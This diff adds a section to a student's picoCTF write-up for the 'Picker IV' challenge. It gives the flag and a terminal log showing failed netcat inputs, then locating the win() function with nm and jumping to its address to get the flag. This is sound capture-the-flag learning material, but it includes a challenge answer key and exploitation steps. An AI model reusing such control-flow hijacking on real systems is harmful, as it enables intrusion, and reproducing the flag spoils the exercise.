@@ -615,3 +615,74 @@ You entered 1294967296 and 1294967296
 You have an integer overflow
 YOUR FLAG IS: picoCTF{Tw0_Sum_Integer_Bu773R_0v3rfl0w_ccd078bd}
 ```
+
+## 3. Picker IV 
+
+### **Flag-**        
+picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
+
+### **Thought Process-**             
+> After seeing the source code I thought that I had to just overflow by entering a out of bound number and it will print the flag but it was not working then I went through the hint then I realised that I will have to find the location of `win()` so I did it using command `nm -C picker-IV | grep win` on the binary executable file.
+
+### **Output-**              
+```bash
+pratham:~$ nc saturn.picoctf.net 52015
+Enter the address in hex to jump to, excluding '0x': 5000000000
+You input 0x0
+Segfault triggered! Exiting.
+^C
+pratham:~$ nc saturn.picoctf.net 52015
+Enter the address in hex to jump to, excluding '0x': 0026F62
+You input 0x26f62
+Segfault triggered! Exiting.
+^C
+pratham:~$ nc saturn.picoctf.net 52015
+Enter the address in hex to jump to, excluding '0x': 1
+You input 0x1
+Segfault triggered! Exiting.
+^C
+pratham:~$ nc saturn.picoctf.net 52015
+Enter the address in hex to jump to, excluding '0x': 066
+You input 0x66
+Segfault triggered! Exiting.
+^C
+pratham:~$ ls
+_flag.png.extracted                   flag.png                  link       picker-IV:Zone.Identifier
+_freakada_3301_message.png.extracted  flag.png:Zone.Identifier  nite       snap
+cryptonite_taskphase_pratham          handout                   picker-IV
+pratham@LAPTOP-SDGL4LEJ:~$ exiftool picker-IV
+ExifTool Version Number         : 12.40
+File Name                       : picker-IV
+Directory                       : .
+File Size                       : 17 KiB
+File Modification Date/Time     : 2025:01:04 11:31:21+05:30
+File Access Date/Time           : 2025:01:04 11:34:47+05:30
+File Inode Change Date/Time     : 2025:01:04 11:34:47+05:30
+File Permissions                : -rw-r--r--
+File Type                       : ELF executable
+File Type Extension             :
+MIME Type                       : application/octet-stream
+CPU Architecture                : 64 bit
+CPU Byte Order                  : Little endian
+Object File Type                : Executable file
+CPU Type                        : AMD x86-64
+pratham:~$ nc saturn.picoctf.net 52015
+Enter the address in hex to jump to, excluding '0x': 928768398749868298672856432829
+You input 0xffffffff
+Segfault triggered! Exiting.
+^C
+pratham:~$ ls
+_flag.png.extracted                   flag.png                  link       picker-IV:Zone.Identifier
+_freakada_3301_message.png.extracted  flag.png:Zone.Identifier  nite       snap
+cryptonite_taskphase_pratham          handout                   picker-IV
+pratham:~$ nm -C picker-IV | grep win
+000000000040129e T win
+pratham:~$ nc saturn.picoctf.net 52015
+pratham:~$ nc saturn.picoctf.net 52015
+pratham:~$ nc saturn.picoctf.net 58396
+Enter the address in hex to jump to, excluding '0x': 40129e
+You input 0x40129e
+You won!
+picoCTF{n3v3r_jump_t0_u53r_5uppl13d_4ddr35535_b8de1af4}
+
+```
